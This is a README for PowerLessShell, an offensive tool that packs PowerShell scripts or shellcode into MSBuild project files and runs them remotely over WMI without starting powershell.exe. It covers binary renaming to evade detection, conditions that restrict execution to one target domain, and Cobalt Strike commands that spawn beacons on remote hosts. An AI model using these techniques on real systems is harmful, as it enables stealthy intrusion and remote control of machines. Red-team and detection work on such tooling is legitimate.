# PowerLessShell

PowerLessShell rely on MSBuild.exe to remotely execute PowerShell scripts and commands without spawning powershell.exe. 
You can also execute raw shellcode using the same approach.

To add another layer of crap the payload will copy msbuild.exe to something random and build the payload using the randomly generated binary.

* You can provide -knownprocess switch to use known Windows process name instead of renaming MsBuild.exe to something random

# MSBuild conditions 

MSBuild support condition that can be used to avoid running code if the condition is not met.

```
<Target Name="x" Condition="'$(USERDOMAIN)'=='RingZer0'">
```

The malicious code will only be executed if the current user domain is "RingZer0"

Condition supports several other formats that can be used to create more conditional execution check.

```
<Target Name="x" Condition="'$(registry:HKEY_LOCAL_MACHINE\blah@blah)'>='0'">
```

Property Functions also expose interesting data.

```
https://docs.microsoft.com/en-us/visualstudio/msbuild/property-functions
```

# Usage

Raw shellcode
```
$ python PowerLessShell.py


PowerLessShell - Remain Stealth
         More PowerShell Less Powershell.exe - Mr.Un1k0d3r RingZer0 Team
            ___
        .-"; ! ;"-.
      .'!  : | :  !`.
     /\  ! : ! : !  /\
    /\ |  ! :|: !  | /\
   (  \ \ ; :!: ; / /  )
  ( `. \ | !:|:! | / .' )
  (`. \ \ \!:|:!/ / / .')
   \ `.`.\ |!|! |/,'.' /
    `._`.\\!!!// .'_.'
       `.`.\|//.'.'
        |`._`n'_.'|
        `----^----"


(Set payload type 'powershell, shellcode')>>> shellcode

(Path to the raw shellcode file)>>> shellcode.raw

(Path for the generated MsBuild out file)>>> payload.csproj

(Set USERDOMAIN condition (Default ''))>>> RingZer0

(Use known process name to perform MsBuild renaming (Default: False))>>>

[+] payload.csproj was generated.
[+] payload.csproj.bat was generated.
[+] Run the command inside of payload.csproj.cmd on the target system using WMI.
```

Powershell
```
$ python PowerLessShell.py


PowerLessShell - Remain Stealth
         More PowerShell Less Powershell.exe - Mr.Un1k0d3r RingZer0 Team
            ___
        .-"; ! ;"-.
      .'!  : | :  !`.
     /\  ! : ! : !  /\
    /\ |  ! :|: !  | /\
   (  \ \ ; :!: ; / /  )
  ( `. \ | !:|:! | / .' )
  (`. \ \ \!:|:!/ / / .')
   \ `.`.\ |!|! |/,'.' /
    `._`.\\!!!// .'_.'
       `.`.\|//.'.'
        |`._`n'_.'|
        `----^----"


(Set payload type 'powershell, shellcode')>>> powershell

(Path to the PowerShell script)>>> payload.ps1

(Path for the generated MsBuild out file)>>> payload.csproj

(Set USERDOMAIN condition (Default ''))>>>

(Use known process name to perform MsBuild renaming (Default: False))>>>

[+] payload.csproj was generated.
[+] payload.csproj.bat was generated.
[+] Run the command inside of payload.csproj.cmd on the target system using WMI.
```

Inline command
```
python PowerLessShell.py powershell.ps1 output (optional shellcode, -knownprocess)


PowerLessShell - Remain Stealth
         More PowerShell Less Powershell.exe - Mr.Un1k0d3r RingZer0 Team
            ___
        .-"; ! ;"-.
      .'!  : | :  !`.
     /\  ! : ! : !  /\
    /\ |  ! :|: !  | /\
   (  \ \ ; :!: ; / /  )
  ( `. \ | !:|:! | / .' )
  (`. \ \ \!:|:!/ / / .')
   \ `.`.\ |!|! |/,'.' /
    `._`.\\!!!// .'_.'
       `.`.\|//.'.'
        |`._`n'_.'|
        `----^----"




[+] output was generated.
[+] output.bat was generated.
[+] Run the command inside of output.cmd on the target system using WMI.
```

# Example

The following example is running the RC4 RAT https://github.com/Mr-Un1k0d3r/RC4-PowerShell-RAT without running a single instance of PowerShell

![PowerLessShell](https://ringzer0team.com/powershellless.png)

# Cobalt Strike Aggressor script (wmi_msbuild.cna) 
By Alyssa (ramen0x3f) and MrT-F
### Set Up
* Either copy PowerLessShell folder to [cobalts working dir]/PowerLessShell or make note of path
* If you didn't copy it to the Cobalt directory: edit the $pls_path variable in this file to point to PowerLessShell
* Load script into Cobalt Strike

### Usage
```
check_msbuild -target TARGET   		Verify .NET 4.0.30319 is installed (should see "Status OK")
	[-user user] [-pass pass]		Windows 7 has .NET 4.0.30319 after 3 reboots and 4 Windows update cycles

rename_msbuild -target TARGET 		Copy MSBuild.exe. 
	-msbuild newname 
 	[-path C:\new\path] 		Default - C:\Users\Public\
	[-user domain\username]		Specifying user/pass spawns cmd on remote host.
 	[-pass password]			

wmi_msbuild -target TARGET 		 	Spawn new beacon. 
         -listener LISTENER
	[-payload new_file]		 	Default - [a-zA-Z].tmp
	[-directory new_dir]			Default - C:\Users\Public\
	[-msbuild alt_msbuild_location] 	
	[-user USERNAME] [-pass PASSWORD]	
	[-manualdelete]				Switch doesn't auto delete payload.
```
### OpSec Notes
Spawns cmd.exe on the target system if
* ManualDelete switch is not set
* rename_msbuild is run with a username/password specified

# Credit
Mr.Un1k0d3r RingZer0 Team 2017

